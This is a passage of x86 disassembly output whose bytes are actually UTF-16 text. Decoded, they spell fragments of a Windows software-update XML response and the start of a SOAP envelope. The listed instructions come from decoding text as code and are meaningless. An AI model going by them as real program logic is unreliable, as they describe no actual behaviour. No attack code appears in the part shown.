  4095c9:	00 3c 00             	add    %bh,(%eax,%eax,1)
  4095cc:	49                   	dec    %ecx
  4095cd:	00 44 00 3e          	add    %al,0x3e(%eax,%eax,1)
  4095d1:	00 7b 00             	add    %bh,0x0(%ebx)
  4095d4:	34 00                	xor    $0x0,%al
  4095d6:	7d 00                	jge    0x4095d8
  4095d8:	3c 00                	cmp    $0x0,%al
  4095da:	2f                   	das
  4095db:	00 49 00             	add    %cl,0x0(%ecx)
  4095de:	44                   	inc    %esp
  4095df:	00 3e                	add    %bh,(%esi)
  4095e1:	00 0d 00 0a 00 09    	add    %cl,0x9000a00
  4095e7:	00 09                	add    %cl,(%ecx)
  4095e9:	00 3c 00             	add    %bh,(%eax,%eax,1)
  4095ec:	44                   	inc    %esp
  4095ed:	00 65 00             	add    %ah,0x0(%ebp)
  4095f0:	70 00                	jo     0x4095f2
  4095f2:	6c                   	insb   (%dx),%es:(%edi)
  4095f3:	00 6f 00             	add    %ch,0x0(%edi)
  4095f6:	79 00                	jns    0x4095f8
  4095f8:	6d                   	insl   (%dx),%es:(%edi)
  4095f9:	00 65 00             	add    %ah,0x0(%ebp)
  4095fc:	6e                   	outsb  %ds:(%esi),(%dx)
  4095fd:	00 74 00 3e          	add    %dh,0x3e(%eax,%eax,1)
  409601:	00 0d 00 0a 00 09    	add    %cl,0x9000a00
  409607:	00 09                	add    %cl,(%ecx)
  409609:	00 09                	add    %cl,(%ecx)
  40960b:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40960e:	49                   	dec    %ecx
  40960f:	00 44 00 3e          	add    %al,0x3e(%eax,%eax,1)
  409613:	00 7b 00             	add    %bh,0x0(%ebx)
  409616:	35 00 7d 00 3c       	xor    $0x3c007d00,%eax
  40961b:	00 2f                	add    %ch,(%edi)
  40961d:	00 49 00             	add    %cl,0x0(%ecx)
  409620:	44                   	inc    %esp
  409621:	00 3e                	add    %bh,(%esi)
  409623:	00 0d 00 0a 00 09    	add    %cl,0x9000a00
  409629:	00 09                	add    %cl,(%ecx)
  40962b:	00 09                	add    %cl,(%ecx)
  40962d:	00 3c 00             	add    %bh,(%eax,%eax,1)
  409630:	41                   	inc    %ecx
  409631:	00 63 00             	add    %ah,0x0(%ebx)
  409634:	74 00                	je     0x409636
  409636:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40963c:	3e 00 42 00          	add    %al,%ds:0x0(%edx)
  409640:	75 00                	jne    0x409642
  409642:	6e                   	outsb  %ds:(%esi),(%dx)
  409643:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  409647:	00 65 00             	add    %ah,0x0(%ebp)
  40964a:	3c 00                	cmp    $0x0,%al
  40964c:	2f                   	das
  40964d:	00 41 00             	add    %al,0x0(%ecx)
  409650:	63 00                	arpl   %eax,(%eax)
  409652:	74 00                	je     0x409654
  409654:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40965a:	3e 00 0d 00 0a 00 09 	add    %cl,%ds:0x9000a00
  409661:	00 09                	add    %cl,(%ecx)
  409663:	00 09                	add    %cl,(%ecx)
  409665:	00 3c 00             	add    %bh,(%eax,%eax,1)
  409668:	49                   	dec    %ecx
  409669:	00 73 00             	add    %dh,0x0(%ebx)
  40966c:	41                   	inc    %ecx
  40966d:	00 73 00             	add    %dh,0x0(%ebx)
  409670:	73 00                	jae    0x409672
  409672:	69 00 67 00 6e 00    	imul   $0x6e0067,(%eax),%eax
  409678:	65 00 64 00 3e       	add    %ah,%gs:0x3e(%eax,%eax,1)
  40967d:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  409681:	00 75 00             	add    %dh,0x0(%ebp)
  409684:	65 00 3c 00          	add    %bh,%gs:(%eax,%eax,1)
  409688:	2f                   	das
  409689:	00 49 00             	add    %cl,0x0(%ecx)
  40968c:	73 00                	jae    0x40968e
  40968e:	41                   	inc    %ecx
  40968f:	00 73 00             	add    %dh,0x0(%ebx)
  409692:	73 00                	jae    0x409694
  409694:	69 00 67 00 6e 00    	imul   $0x6e0067,(%eax),%eax
  40969a:	65 00 64 00 3e       	add    %ah,%gs:0x3e(%eax,%eax,1)
  40969f:	00 0d 00 0a 00 09    	add    %cl,0x9000a00
  4096a5:	00 09                	add    %cl,(%ecx)
  4096a7:	00 09                	add    %cl,(%ecx)
  4096a9:	00 3c 00             	add    %bh,(%eax,%eax,1)
  4096ac:	4c                   	dec    %esp
  4096ad:	00 61 00             	add    %ah,0x0(%ecx)
  4096b0:	73 00                	jae    0x4096b2
  4096b2:	74 00                	je     0x4096b4
  4096b4:	43                   	inc    %ebx
  4096b5:	00 68 00             	add    %ch,0x0(%eax)
  4096b8:	61                   	popa
  4096b9:	00 6e 00             	add    %ch,0x0(%esi)
  4096bc:	67 00 65 00          	add    %ah,0x0(%di)
  4096c0:	54                   	push   %esp
  4096c1:	00 69 00             	add    %ch,0x0(%ecx)
  4096c4:	6d                   	insl   (%dx),%es:(%edi)
  4096c5:	00 65 00             	add    %ah,0x0(%ebp)
  4096c8:	3e 00 32             	add    %dh,%ds:(%edx)
  4096cb:	00 30                	add    %dh,(%eax)
  4096cd:	00 32                	add    %dh,(%edx)
  4096cf:	00 30                	add    %dh,(%eax)
  4096d1:	00 2d 00 30 00 32    	add    %ch,0x32003000
  4096d7:	00 2d 00 32 00 39    	add    %ch,0x39003200
  4096dd:	00 3c 00             	add    %bh,(%eax,%eax,1)
  4096e0:	2f                   	das
  4096e1:	00 4c 00 61          	add    %cl,0x61(%eax,%eax,1)
  4096e5:	00 73 00             	add    %dh,0x0(%ebx)
  4096e8:	74 00                	je     0x4096ea
  4096ea:	43                   	inc    %ebx
  4096eb:	00 68 00             	add    %ch,0x0(%eax)
  4096ee:	61                   	popa
  4096ef:	00 6e 00             	add    %ch,0x0(%esi)
  4096f2:	67 00 65 00          	add    %ah,0x0(%di)
  4096f6:	54                   	push   %esp
  4096f7:	00 69 00             	add    %ch,0x0(%ecx)
  4096fa:	6d                   	insl   (%dx),%es:(%edi)
  4096fb:	00 65 00             	add    %ah,0x0(%ebp)
  4096fe:	3e 00 0d 00 0a 00 09 	add    %cl,%ds:0x9000a00
  409705:	00 09                	add    %cl,(%ecx)
  409707:	00 09                	add    %cl,(%ecx)
  409709:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40970c:	41                   	inc    %ecx
  40970d:	00 75 00             	add    %dh,0x0(%ebp)
  409710:	74 00                	je     0x409712
  409712:	6f                   	outsl  %ds:(%esi),(%dx)
  409713:	00 53 00             	add    %dl,0x0(%ebx)
  409716:	65 00 6c 00 65       	add    %ch,%gs:0x65(%eax,%eax,1)
  40971b:	00 63 00             	add    %ah,0x0(%ebx)
  40971e:	74 00                	je     0x409720
  409720:	3e 00 30             	add    %dh,%ds:(%eax)
  409723:	00 3c 00             	add    %bh,(%eax,%eax,1)
  409726:	2f                   	das
  409727:	00 41 00             	add    %al,0x0(%ecx)
  40972a:	75 00                	jne    0x40972c
  40972c:	74 00                	je     0x40972e
  40972e:	6f                   	outsl  %ds:(%esi),(%dx)
  40972f:	00 53 00             	add    %dl,0x0(%ebx)
  409732:	65 00 6c 00 65       	add    %ch,%gs:0x65(%eax,%eax,1)
  409737:	00 63 00             	add    %ah,0x0(%ebx)
  40973a:	74 00                	je     0x40973c
  40973c:	3e 00 0d 00 0a 00 09 	add    %cl,%ds:0x9000a00
  409743:	00 09                	add    %cl,(%ecx)
  409745:	00 09                	add    %cl,(%ecx)
  409747:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40974a:	41                   	inc    %ecx
  40974b:	00 75 00             	add    %dh,0x0(%ebp)
  40974e:	74 00                	je     0x409750
  409750:	6f                   	outsl  %ds:(%esi),(%dx)
  409751:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  409755:	00 77 00             	add    %dh,0x0(%edi)
  409758:	6e                   	outsb  %ds:(%esi),(%dx)
  409759:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  40975d:	00 61 00             	add    %ah,0x0(%ecx)
  409760:	64 00 3e             	add    %bh,%fs:(%esi)
  409763:	00 30                	add    %dh,(%eax)
  409765:	00 3c 00             	add    %bh,(%eax,%eax,1)
  409768:	2f                   	das
  409769:	00 41 00             	add    %al,0x0(%ecx)
  40976c:	75 00                	jne    0x40976e
  40976e:	74 00                	je     0x409770
  409770:	6f                   	outsl  %ds:(%esi),(%dx)
  409771:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  409775:	00 77 00             	add    %dh,0x0(%edi)
  409778:	6e                   	outsb  %ds:(%esi),(%dx)
  409779:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  40977d:	00 61 00             	add    %ah,0x0(%ecx)
  409780:	64 00 3e             	add    %bh,%fs:(%esi)
  409783:	00 0d 00 0a 00 09    	add    %cl,0x9000a00
  409789:	00 09                	add    %cl,(%ecx)
  40978b:	00 09                	add    %cl,(%ecx)
  40978d:	00 3c 00             	add    %bh,(%eax,%eax,1)
  409790:	53                   	push   %ebx
  409791:	00 75 00             	add    %dh,0x0(%ebp)
  409794:	70 00                	jo     0x409796
  409796:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40979a:	73 00                	jae    0x40979c
  40979c:	65 00 64 00 65       	add    %ah,%gs:0x65(%eax,%eax,1)
  4097a1:	00 6e 00             	add    %ch,0x0(%esi)
  4097a4:	63 00                	arpl   %eax,(%eax)
  4097a6:	65 00 42 00          	add    %al,%gs:0x0(%edx)
  4097aa:	65 00 68 00          	add    %ch,%gs:0x0(%eax)
  4097ae:	61                   	popa
  4097af:	00 76 00             	add    %dh,0x0(%esi)
  4097b2:	69 00 6f 00 72 00    	imul   $0x72006f,(%eax),%eax
  4097b8:	3e 00 30             	add    %dh,%ds:(%eax)
  4097bb:	00 3c 00             	add    %bh,(%eax,%eax,1)
  4097be:	2f                   	das
  4097bf:	00 53 00             	add    %dl,0x0(%ebx)
  4097c2:	75 00                	jne    0x4097c4
  4097c4:	70 00                	jo     0x4097c6
  4097c6:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4097ca:	73 00                	jae    0x4097cc
  4097cc:	65 00 64 00 65       	add    %ah,%gs:0x65(%eax,%eax,1)
  4097d1:	00 6e 00             	add    %ch,0x0(%esi)
  4097d4:	63 00                	arpl   %eax,(%eax)
  4097d6:	65 00 42 00          	add    %al,%gs:0x0(%edx)
  4097da:	65 00 68 00          	add    %ch,%gs:0x0(%eax)
  4097de:	61                   	popa
  4097df:	00 76 00             	add    %dh,0x0(%esi)
  4097e2:	69 00 6f 00 72 00    	imul   $0x72006f,(%eax),%eax
  4097e8:	3e 00 0d 00 0a 00 09 	add    %cl,%ds:0x9000a00
  4097ef:	00 09                	add    %cl,(%ecx)
  4097f1:	00 3c 00             	add    %bh,(%eax,%eax,1)
  4097f4:	2f                   	das
  4097f5:	00 44 00 65          	add    %al,0x65(%eax,%eax,1)
  4097f9:	00 70 00             	add    %dh,0x0(%eax)
  4097fc:	6c                   	insb   (%dx),%es:(%edi)
  4097fd:	00 6f 00             	add    %ch,0x0(%edi)
  409800:	79 00                	jns    0x409802
  409802:	6d                   	insl   (%dx),%es:(%edi)
  409803:	00 65 00             	add    %ah,0x0(%ebp)
  409806:	6e                   	outsb  %ds:(%esi),(%dx)
  409807:	00 74 00 3e          	add    %dh,0x3e(%eax,%eax,1)
  40980b:	00 0d 00 0a 00 09    	add    %cl,0x9000a00
  409811:	00 09                	add    %cl,(%ecx)
  409813:	00 3c 00             	add    %bh,(%eax,%eax,1)
  409816:	49                   	dec    %ecx
  409817:	00 73 00             	add    %dh,0x0(%ebx)
  40981a:	4c                   	dec    %esp
  40981b:	00 65 00             	add    %ah,0x0(%ebp)
  40981e:	61                   	popa
  40981f:	00 66 00             	add    %ah,0x0(%esi)
  409822:	3e 00 74 00 72       	add    %dh,%ds:0x72(%eax,%eax,1)
  409827:	00 75 00             	add    %dh,0x0(%ebp)
  40982a:	65 00 3c 00          	add    %bh,%gs:(%eax,%eax,1)
  40982e:	2f                   	das
  40982f:	00 49 00             	add    %cl,0x0(%ecx)
  409832:	73 00                	jae    0x409834
  409834:	4c                   	dec    %esp
  409835:	00 65 00             	add    %ah,0x0(%ebp)
  409838:	61                   	popa
  409839:	00 66 00             	add    %ah,0x0(%esi)
  40983c:	3e 00 0d 00 0a 00 09 	add    %cl,%ds:0x9000a00
  409843:	00 09                	add    %cl,(%ecx)
  409845:	00 3c 00             	add    %bh,(%eax,%eax,1)
  409848:	58                   	pop    %eax
  409849:	00 6d 00             	add    %ch,0x0(%ebp)
  40984c:	6c                   	insb   (%dx),%es:(%edi)
  40984d:	00 3e                	add    %bh,(%esi)
  40984f:	00 26                	add    %ah,(%esi)
  409851:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  409855:	00 3b                	add    %bh,(%ebx)
  409857:	00 55 00             	add    %dl,0x0(%ebp)
  40985a:	70 00                	jo     0x40985c
  40985c:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  409860:	74 00                	je     0x409862
  409862:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  409866:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40986a:	6e                   	outsb  %ds:(%esi),(%dx)
  40986b:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40986f:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  409873:	00 20                	add    %ah,(%eax)
  409875:	00 55 00             	add    %dl,0x0(%ebp)
  409878:	70 00                	jo     0x40987a
  40987a:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40987e:	74 00                	je     0x409880
  409880:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  409884:	44                   	inc    %esp
  409885:	00 3d 00 22 00 7b    	add    %bh,0x7b002200
  40988b:	00 36                	add    %dh,(%esi)
  40988d:	00 7d 00             	add    %bh,0x0(%ebp)
  409890:	22 00                	and    (%eax),%al
  409892:	20 00                	and    %al,(%eax)
  409894:	52                   	push   %edx
  409895:	00 65 00             	add    %ah,0x0(%ebp)
  409898:	76 00                	jbe    0x40989a
  40989a:	69 00 73 00 69 00    	imul   $0x690073,(%eax),%eax
  4098a0:	6f                   	outsl  %ds:(%esi),(%dx)
  4098a1:	00 6e 00             	add    %ch,0x0(%esi)
  4098a4:	4e                   	dec    %esi
  4098a5:	00 75 00             	add    %dh,0x0(%ebp)
  4098a8:	6d                   	insl   (%dx),%es:(%edi)
  4098a9:	00 62 00             	add    %ah,0x0(%edx)
  4098ac:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4098b0:	3d 00 22 00 32       	cmp    $0x32002200,%eax
  4098b5:	00 30                	add    %dh,(%eax)
  4098b7:	00 34 00             	add    %dh,(%eax,%eax,1)
  4098ba:	22 00                	and    (%eax),%al
  4098bc:	20 00                	and    %al,(%eax)
  4098be:	2f                   	das
  4098bf:	00 26                	add    %ah,(%esi)
  4098c1:	00 67 00             	add    %ah,0x0(%edi)
  4098c4:	74 00                	je     0x4098c6
  4098c6:	3b 00                	cmp    (%eax),%eax
  4098c8:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  4098cd:	00 3b                	add    %bh,(%ebx)
  4098cf:	00 50 00             	add    %dl,0x0(%eax)
  4098d2:	72 00                	jb     0x4098d4
  4098d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4098d5:	00 70 00             	add    %dh,0x0(%eax)
  4098d8:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4098dc:	74 00                	je     0x4098de
  4098de:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  4098e4:	20 00                	and    %al,(%eax)
  4098e6:	55                   	push   %ebp
  4098e7:	00 70 00             	add    %dh,0x0(%eax)
  4098ea:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  4098ee:	74 00                	je     0x4098f0
  4098f0:	65 00 54 00 79       	add    %dl,%gs:0x79(%eax,%eax,1)
  4098f5:	00 70 00             	add    %dh,0x0(%eax)
  4098f8:	65 00 3d 00 22 00 53 	add    %bh,%gs:0x53002200
  4098ff:	00 6f 00             	add    %ch,0x0(%edi)
  409902:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  409907:	00 61 00             	add    %ah,0x0(%ecx)
  40990a:	72 00                	jb     0x40990c
  40990c:	65 00 22             	add    %ah,%gs:(%edx)
  40990f:	00 20                	add    %ah,(%eax)
  409911:	00 2f                	add    %ch,(%edi)
  409913:	00 26                	add    %ah,(%esi)
  409915:	00 67 00             	add    %ah,0x0(%edi)
  409918:	74 00                	je     0x40991a
  40991a:	3b 00                	cmp    (%eax),%eax
  40991c:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  409921:	00 3b                	add    %bh,(%ebx)
  409923:	00 52 00             	add    %dl,0x0(%edx)
  409926:	65 00 6c 00 61       	add    %ch,%gs:0x61(%eax,%eax,1)
  40992b:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40992f:	00 6f 00             	add    %ch,0x0(%edi)
  409932:	6e                   	outsb  %ds:(%esi),(%dx)
  409933:	00 73 00             	add    %dh,0x0(%ebx)
  409936:	68 00 69 00 70       	push   $0x70006900
  40993b:	00 73 00             	add    %dh,0x0(%ebx)
  40993e:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  409942:	74 00                	je     0x409944
  409944:	3b 00                	cmp    (%eax),%eax
  409946:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40994b:	00 3b                	add    %bh,(%ebx)
  40994d:	00 2f                	add    %ch,(%edi)
  40994f:	00 52 00             	add    %dl,0x0(%edx)
  409952:	65 00 6c 00 61       	add    %ch,%gs:0x61(%eax,%eax,1)
  409957:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40995b:	00 6f 00             	add    %ch,0x0(%edi)
  40995e:	6e                   	outsb  %ds:(%esi),(%dx)
  40995f:	00 73 00             	add    %dh,0x0(%ebx)
  409962:	68 00 69 00 70       	push   $0x70006900
  409967:	00 73 00             	add    %dh,0x0(%ebx)
  40996a:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  40996e:	74 00                	je     0x409970
  409970:	3b 00                	cmp    (%eax),%eax
  409972:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  409977:	00 3b                	add    %bh,(%ebx)
  409979:	00 41 00             	add    %al,0x0(%ecx)
  40997c:	70 00                	jo     0x40997e
  40997e:	70 00                	jo     0x409980
  409980:	6c                   	insb   (%dx),%es:(%edi)
  409981:	00 69 00             	add    %ch,0x0(%ecx)
  409984:	63 00                	arpl   %eax,(%eax)
  409986:	61                   	popa
  409987:	00 62 00             	add    %ah,0x0(%edx)
  40998a:	69 00 6c 00 69 00    	imul   $0x69006c,(%eax),%eax
  409990:	74 00                	je     0x409992
  409992:	79 00                	jns    0x409994
  409994:	52                   	push   %edx
  409995:	00 75 00             	add    %dh,0x0(%ebp)
  409998:	6c                   	insb   (%dx),%es:(%edi)
  409999:	00 65 00             	add    %ah,0x0(%ebp)
  40999c:	73 00                	jae    0x40999e
  40999e:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  4099a2:	74 00                	je     0x4099a4
  4099a4:	3b 00                	cmp    (%eax),%eax
  4099a6:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  4099ab:	00 3b                	add    %bh,(%ebx)
  4099ad:	00 49 00             	add    %cl,0x0(%ecx)
  4099b0:	73 00                	jae    0x4099b2
  4099b2:	49                   	dec    %ecx
  4099b3:	00 6e 00             	add    %ch,0x0(%esi)
  4099b6:	73 00                	jae    0x4099b8
  4099b8:	74 00                	je     0x4099ba
  4099ba:	61                   	popa
  4099bb:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  4099bf:	00 65 00             	add    %ah,0x0(%ebp)
  4099c2:	64 00 26             	add    %ah,%fs:(%esi)
  4099c5:	00 67 00             	add    %ah,0x0(%edi)
  4099c8:	74 00                	je     0x4099ca
  4099ca:	3b 00                	cmp    (%eax),%eax
  4099cc:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  4099d1:	00 3b                	add    %bh,(%ebx)
  4099d3:	00 46 00             	add    %al,0x0(%esi)
  4099d6:	61                   	popa
  4099d7:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  4099db:	00 65 00             	add    %ah,0x0(%ebp)
  4099de:	20 00                	and    %al,(%eax)
  4099e0:	2f                   	das
  4099e1:	00 26                	add    %ah,(%esi)
  4099e3:	00 67 00             	add    %ah,0x0(%edi)
  4099e6:	74 00                	je     0x4099e8
  4099e8:	3b 00                	cmp    (%eax),%eax
  4099ea:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  4099ef:	00 3b                	add    %bh,(%ebx)
  4099f1:	00 2f                	add    %ch,(%edi)
  4099f3:	00 49 00             	add    %cl,0x0(%ecx)
  4099f6:	73 00                	jae    0x4099f8
  4099f8:	49                   	dec    %ecx
  4099f9:	00 6e 00             	add    %ch,0x0(%esi)
  4099fc:	73 00                	jae    0x4099fe
  4099fe:	74 00                	je     0x409a00
  409a00:	61                   	popa
  409a01:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  409a05:	00 65 00             	add    %ah,0x0(%ebp)
  409a08:	64 00 26             	add    %ah,%fs:(%esi)
  409a0b:	00 67 00             	add    %ah,0x0(%edi)
  409a0e:	74 00                	je     0x409a10
  409a10:	3b 00                	cmp    (%eax),%eax
  409a12:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  409a17:	00 3b                	add    %bh,(%ebx)
  409a19:	00 49 00             	add    %cl,0x0(%ecx)
  409a1c:	73 00                	jae    0x409a1e
  409a1e:	49                   	dec    %ecx
  409a1f:	00 6e 00             	add    %ch,0x0(%esi)
  409a22:	73 00                	jae    0x409a24
  409a24:	74 00                	je     0x409a26
  409a26:	61                   	popa
  409a27:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  409a2b:	00 61 00             	add    %ah,0x0(%ecx)
  409a2e:	62 00                	bound  %eax,(%eax)
  409a30:	6c                   	insb   (%dx),%es:(%edi)
  409a31:	00 65 00             	add    %ah,0x0(%ebp)
  409a34:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  409a38:	74 00                	je     0x409a3a
  409a3a:	3b 00                	cmp    (%eax),%eax
  409a3c:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  409a41:	00 3b                	add    %bh,(%ebx)
  409a43:	00 54 00 72          	add    %dl,0x72(%eax,%eax,1)
  409a47:	00 75 00             	add    %dh,0x0(%ebp)
  409a4a:	65 00 20             	add    %ah,%gs:(%eax)
  409a4d:	00 2f                	add    %ch,(%edi)
  409a4f:	00 26                	add    %ah,(%esi)
  409a51:	00 67 00             	add    %ah,0x0(%edi)
  409a54:	74 00                	je     0x409a56
  409a56:	3b 00                	cmp    (%eax),%eax
  409a58:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  409a5d:	00 3b                	add    %bh,(%ebx)
  409a5f:	00 2f                	add    %ch,(%edi)
  409a61:	00 49 00             	add    %cl,0x0(%ecx)
  409a64:	73 00                	jae    0x409a66
  409a66:	49                   	dec    %ecx
  409a67:	00 6e 00             	add    %ch,0x0(%esi)
  409a6a:	73 00                	jae    0x409a6c
  409a6c:	74 00                	je     0x409a6e
  409a6e:	61                   	popa
  409a6f:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  409a73:	00 61 00             	add    %ah,0x0(%ecx)
  409a76:	62 00                	bound  %eax,(%eax)
  409a78:	6c                   	insb   (%dx),%es:(%edi)
  409a79:	00 65 00             	add    %ah,0x0(%ebp)
  409a7c:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  409a80:	74 00                	je     0x409a82
  409a82:	3b 00                	cmp    (%eax),%eax
  409a84:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  409a89:	00 3b                	add    %bh,(%ebx)
  409a8b:	00 2f                	add    %ch,(%edi)
  409a8d:	00 41 00             	add    %al,0x0(%ecx)
  409a90:	70 00                	jo     0x409a92
  409a92:	70 00                	jo     0x409a94
  409a94:	6c                   	insb   (%dx),%es:(%edi)
  409a95:	00 69 00             	add    %ch,0x0(%ecx)
  409a98:	63 00                	arpl   %eax,(%eax)
  409a9a:	61                   	popa
  409a9b:	00 62 00             	add    %ah,0x0(%edx)
  409a9e:	69 00 6c 00 69 00    	imul   $0x69006c,(%eax),%eax
  409aa4:	74 00                	je     0x409aa6
  409aa6:	79 00                	jns    0x409aa8
  409aa8:	52                   	push   %edx
  409aa9:	00 75 00             	add    %dh,0x0(%ebp)
  409aac:	6c                   	insb   (%dx),%es:(%edi)
  409aad:	00 65 00             	add    %ah,0x0(%ebp)
  409ab0:	73 00                	jae    0x409ab2
  409ab2:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  409ab6:	74 00                	je     0x409ab8
  409ab8:	3b 00                	cmp    (%eax),%eax
  409aba:	3c 00                	cmp    $0x0,%al
  409abc:	2f                   	das
  409abd:	00 58 00             	add    %bl,0x0(%eax)
  409ac0:	6d                   	insl   (%dx),%es:(%edi)
  409ac1:	00 6c 00 3e          	add    %ch,0x3e(%eax,%eax,1)
  409ac5:	00 0d 00 0a 00 09    	add    %cl,0x9000a00
  409acb:	00 3c 00             	add    %bh,(%eax,%eax,1)
  409ace:	2f                   	das
  409acf:	00 55 00             	add    %dl,0x0(%ebp)
  409ad2:	70 00                	jo     0x409ad4
  409ad4:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  409ad8:	74 00                	je     0x409ada
  409ada:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  409ade:	6e                   	outsb  %ds:(%esi),(%dx)
  409adf:	00 66 00             	add    %ah,0x0(%esi)
  409ae2:	6f                   	outsl  %ds:(%esi),(%dx)
  409ae3:	00 3e                	add    %bh,(%esi)
  409ae5:	00 0d 00 0a 00 3c    	add    %cl,0x3c000a00
  409aeb:	00 2f                	add    %ch,(%edi)
  409aed:	00 4e 00             	add    %cl,0x0(%esi)
  409af0:	65 00 77 00          	add    %dh,%gs:0x0(%edi)
  409af4:	55                   	push   %ebp
  409af5:	00 70 00             	add    %dh,0x0(%eax)
  409af8:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  409afc:	74 00                	je     0x409afe
  409afe:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  409b02:	3e 00 0d 00 0a 00 01 	add    %cl,%ds:0x1000a00
  409b09:	9a 2f 0d 00 0a 00 3c 	lcall  $0x3c00,$0xa000d2f
  409b10:	00 73 00             	add    %dh,0x0(%ebx)
  409b13:	3a 00                	cmp    (%eax),%al
  409b15:	45                   	inc    %ebp
  409b16:	00 6e 00             	add    %ch,0x0(%esi)
  409b19:	76 00                	jbe    0x409b1b
  409b1b:	65 00 6c 00 6f       	add    %ch,%gs:0x6f(%eax,%eax,1)
  409b20:	00 70 00             	add    %dh,0x0(%eax)
  409b23:	65 00 20             	add    %ah,%gs:(%eax)
  409b26:	00 78 00             	add    %bh,0x0(%eax)
  409b29:	6d                   	insl   (%dx),%es:(%edi)
  409b2a:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  409b2e:	00 73 00             	add    %dh,0x0(%ebx)
  409b31:	3a 00                	cmp    (%eax),%al
  409b33:	73 00                	jae    0x409b35
  409b35:	3d 00 22 00 68       	cmp    $0x68002200,%eax
  409b3a:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  409b3e:	00 70 00             	add    %dh,0x0(%eax)
  409b41:	3a 00                	cmp    (%eax),%al
  409b43:	2f                   	das
  409b44:	00 2f                	add    %ch,(%edi)
  409b46:	00 73 00             	add    %dh,0x0(%ebx)
  409b49:	63 00                	arpl   %eax,(%eax)
  409b4b:	68 00 65 00 6d       	push   $0x6d006500
  409b50:	00 61 00             	add    %ah,0x0(%ecx)
  409b53:	73 00                	jae    0x409b55
  409b55:	2e 00 78 00          	add    %bh,%cs:0x0(%eax)
  409b59:	6d                   	insl   (%dx),%es:(%edi)
  409b5a:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  409b5e:	00 6f 00             	add    %ch,0x0(%edi)
  409b61:	61                   	popa
  409b62:	00 70 00             	add    %dh,0x0(%eax)
  409b65:	2e 00 6f 00          	add    %ch,%cs:0x0(%edi)
  409b69:	72 00                	jb     0x409b6b
  409b6b:	67 00 2f             	add    %ch,(%bx)
  409b6e:	00 73 00             	add    %dh,0x0(%ebx)
  409b71:	6f                   	outsl  %ds:(%esi),(%dx)
  409b72:	00 61 00             	add    %ah,0x0(%ecx)
  409b75:	70 00                	jo     0x409b77
  409b77:	2f                   	das
  409b78:	00 65 00             	add    %ah,0x0(%ebp)
  409b7b:	6e                   	outsb  %ds:(%esi),(%dx)
  409b7c:	00 76 00             	add    %dh,0x0(%esi)
  409b7f:	65 00 6c 00 6f       	add    %ch,%gs:0x6f(%eax,%eax,1)
  409b84:	00 70 00             	add    %dh,0x0(%eax)
  409b87:	65 00 2f             	add    %ch,%gs:(%edi)
  409b8a:	00 22                	add    %ah,(%edx)
  409b8c:	00 3e                	add    %bh,(%esi)
  409b8e:	00 0d 00 0a 00 20    	add    %cl,0x20000a00
  409b94:	00 20                	add    %ah,(%eax)
  409b96:	00 20                	add    %ah,(%eax)
  409b98:	00 20                	add    %ah,(%eax)
  409b9a:	00 3c 00             	add    %bh,(%eax,%eax,1)
  409b9d:	73 00                	jae    0x409b9f
  409b9f:	3a 00                	cmp    (%eax),%al
  409ba1:	42                   	inc    %edx
  409ba2:	00 6f 00             	add    %ch,0x0(%edi)
